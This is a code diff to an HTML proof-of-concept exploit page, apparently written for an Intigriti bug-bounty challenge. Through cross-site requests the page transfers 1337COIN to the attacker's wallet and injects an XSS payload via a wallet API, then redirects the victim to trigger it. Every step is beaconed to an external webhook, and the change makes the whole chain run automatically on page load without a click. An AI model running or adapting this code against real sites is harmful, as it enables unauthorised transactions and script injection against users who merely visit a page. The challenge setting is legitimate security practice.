@@ -5,8 +5,7 @@
 </head>
 <body>
     <h1>XSS Proof of Concept</h1>
-    <button id="exploitBtn">Click to Run Exploit</button>
-    <div id="status">Waiting...</div>
+    <div id="status">Initializing exploit...</div>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
@@ -16,32 +15,18 @@
 
         // Webhook tracking function
         function track(step, status, data = {}) {
-            const url = `${WEBHOOK}/${step}-${status}`;
-            const payload = {
-                step: step,
-                status: status,
-                data: data,
-                timestamp: new Date().toISOString()
-            };
-
-            // Send via Image (fire and forget)
             new Image().src = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
-
             console.log(`[Webhook] ${step}: ${status}`, data);
         }
 
         async function runExploit() {
-            const btn = document.getElementById('exploitBtn');
             const statusDiv = document.getElementById('status');
 
-            btn.disabled = true;
-            btn.style.opacity = '0.5';
-
-            track('start', 'exploit_triggered', { wallet: YOUR_WALLET });
+            track('start', 'exploit_triggered_onload', { wallet: YOUR_WALLET });
 
             try {
-                // Step 1: Send 1337COIN to your wallet (required for flag)
-                statusDiv.textContent = 'Step 1: Sending 1337COIN to your wallet...';
+                // Step 1: Send 1337COIN to your wallet
+                statusDiv.textContent = 'Step 1: Sending 1337COIN...';
                 track('step1', 'sending_coins', { toAddress: YOUR_WALLET, currency: '1337COIN', amount: 1337 });
 
                 const txResponse = await fetch(`${BASE}/api/transaction`, {
@@ -51,22 +36,20 @@
                     body: JSON.stringify({
                         toAddress: YOUR_WALLET,
                         currency: '1337COIN',
-                        amount: 1
+                        amount: 1337
                     })
                 });
 
                 if (txResponse.ok) {
                     const txResult = await txResponse.json();
-                    statusDiv.textContent = '✓ Coins sent! TX: ' + (txResult.txHash || 'success');
-                    track('step1', 'coins_sent_success', { txHash: txResult.txHash, result: txResult });
+                    statusDiv.textContent = '✓ Coins sent!';
+                    track('step1', 'coins_sent_success', { txHash: txResult.txHash });
                 } else {
-                    const errorText = await txResponse.text();
-                    statusDiv.textContent = '⚠ Transaction failed: ' + txResponse.status;
-                    track('step1', 'coins_failed', { status: txResponse.status, error: errorText });
+                    track('step1', 'coins_failed', { status: txResponse.status });
                 }
 
                 // Step 2: Inject XSS via wallet creation
-                statusDiv.textContent = 'Step 2: Injecting XSS payload via wallet API...';
+                statusDiv.textContent = 'Step 2: Injecting XSS payload...';
                 track('step2', 'injecting_xss', { payload: XSS_PAYLOAD });
 
                 const walletResponse = await fetch(`${BASE}/api/wallets`, {
@@ -80,37 +63,30 @@
                     })
                 });
 
-                if (walletResponse.ok) {
-                    statusDiv.textContent = '✓ XSS injected! Redirecting to dashboard...';
-                    track('step2', 'xss_injected_success', { message: 'XSS payload injected via wallet API' });
-                } else {
-                    const errorText = await walletResponse.text();
-                    statusDiv.textContent = '⚠ Wallet API returned ' + walletResponse.status + ' - Redirecting anyway...';
-                    track('step2', 'xss_injected_partial', { status: walletResponse.status, error: errorText });
-                }
+                track('step2', 'xss_injected', { status: walletResponse.status });
 
                 // Step 3: Redirect to dashboard to trigger XSS
                 statusDiv.textContent = 'Step 3: Triggering XSS...';
-                track('step3', 'redirecting_to_dashboard', { target: `${BASE}/dashboard.html` });
+                track('step3', 'redirecting_to_dashboard', {});
 
                 setTimeout(() => {
-                    track('final', 'redirected', { message: 'Should trigger alert("gigawatz")' });
+                    track('final', 'redirected', {});
                     window.location.href = `${BASE}/dashboard.html`;
                 }, 500);
 
             } catch (error) {
-                statusDiv.textContent = `Error: ${error.message}`;
-                track('error', 'exception', { error: error.message, stack: error.stack });
-
-                // Fallback: Try redirecting anyway
+                track('error', 'exception', { error: error.message });
                 setTimeout(() => {
-                    track('fallback', 'redirecting_anyway', { message: 'Attempting redirect after error' });
                     window.location.href = `${BASE}/dashboard.html`;
-                }, 1500);
+                }, 1000);
             }
         }
 
-        document.getElementById('exploitBtn').addEventListener('click', runExploit);
+        // Auto-run on page load
+        window.addEventListener('load', () => {
+            setTimeout(runExploit, 100);
+        });
     </script>
 </body>
 </html>
+
